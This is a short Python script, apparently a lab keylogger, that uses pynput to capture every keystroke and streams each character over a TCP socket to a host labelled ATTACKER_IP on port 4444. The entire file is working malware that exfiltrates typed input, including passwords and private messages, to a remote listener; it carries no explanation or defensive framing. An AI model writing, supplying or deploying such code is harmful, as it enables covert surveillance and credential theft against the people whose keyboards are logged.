from pynput import keyboard
import socket

ATTACKER_IP = "192.168.56.20"
PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ATTACKER_IP, PORT))

def on_press(key):
	try:
		char = key.char
		if char:
			client.send(char.encode())
	except AttributeError:
		if key == keyboard.Key.space:
			client.send(" ".encode())
		elif key == keyboard.Key.enter:
			client.send("\n".encode())

with keyboard.Listener(on_press=on_press) as listener:
	listener.join()
